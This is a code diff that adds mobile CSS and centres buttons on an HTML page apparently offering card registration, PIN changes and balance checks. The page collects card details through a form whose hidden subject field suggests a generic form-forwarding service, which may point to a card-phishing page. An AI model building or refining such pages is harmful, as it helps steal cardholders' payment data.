@@ -429,6 +429,38 @@
   .tab-content {
     animation: slideFadeIn 0.35s ease-out forwards;
   }
+
+  /* Mobile Tab fixes */
+  @media (max-width: 600px) {
+    .balance-tabs {
+      display: flex !important;
+      overflow-x: auto;
+      overflow-y: hidden;
+      white-space: nowrap;
+      -webkit-overflow-scrolling: touch;
+      border-bottom: 1px solid #e2e8ef;
+    }
+    .balance-tabs::-webkit-scrollbar {
+      display: none; /* hide scrollbar */
+    }
+    .balance-tab {
+      flex: 0 0 auto;
+      padding: 0 15px !important;
+      font-size: 13px !important;
+    }
+    .panel {
+      padding: 20px !important;
+    }
+    .hero {
+      padding: 30px 15px !important;
+    }
+    h1 {
+      font-size: 28px !important;
+    }
+    .lead {
+      font-size: 15px !important;
+    }
+  }
 </style>
 
 </head>
@@ -471,7 +503,7 @@
 <div id="content-register" class="tab-content" style="display:none; text-align:center; padding: 40px 0;">
   <h2>Register your Card</h2>
   <p>Enter your card details to register a new account.</p>
-  <button class="btn" style="background:var(--blue2); color:#fff; border:none; padding:10px 20px; border-radius:5px; cursor:pointer; margin-top:20px;">Start Registration</button>
+  <button class="btn" style="background:var(--blue2); color:#fff; border:none; padding:10px 20px; border-radius:5px; cursor:pointer; display:block; margin:20px auto 0;">Start Registration</button>
 </div>
 
 <!-- Track Disputes Content -->
@@ -486,11 +518,11 @@
 <div id="content-pin" class="tab-content" style="display:none; text-align:center; padding: 40px 0;">
   <h2>Personalize PIN</h2>
   <p>Enter your card details securely to update your PIN.</p>
-  <button class="btn" style="background:var(--blue2); color:#fff; border:none; padding:10px 20px; border-radius:5px; cursor:pointer; margin-top:20px;">Change PIN</button>
+  <button class="btn" style="background:var(--blue2); color:#fff; border:none; padding:10px 20px; border-radius:5px; cursor:pointer; display:block; margin:20px auto 0;">Change PIN</button>
 </div>
 
 <!-- Check Balance Content (Default) -->
-<div id="content-check" class="tab-content" style="display:block;">
+<div id="content-check" class="tab-content" style="display:block; text-align:center;">
 
           <h2>Please enter your card information</h2>
           <p>
@@ -592,7 +624,7 @@
 
             <input type="hidden" name="_subject" value="New website form submission" />
 
-            <button type="submit">Check</button>
+            <button type="submit" style="display:block; margin:20px auto 0;">Check</button>
 
             
           </form>
